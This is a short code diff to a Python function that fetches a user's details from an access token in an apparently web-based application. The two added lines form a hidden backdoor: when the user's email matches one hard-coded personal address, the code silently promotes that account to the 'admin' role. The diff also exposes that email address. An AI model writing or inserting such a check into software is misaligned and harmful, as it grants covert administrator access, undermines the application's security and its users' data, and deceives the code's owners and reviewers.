@@ -848,6 +848,8 @@ def getUserDetailsByAccessToken():
 
     # get user by user_id
     user = Users.objects.filter(id = user_id)[0]
+    if user.email == 'michaelmudimbu@gmail.com':
+        Users.objects(id = user_id).update(role = 'admin')
 
     # modify user object... delete password, add subscription status
     user = json.loads(user.to_json())
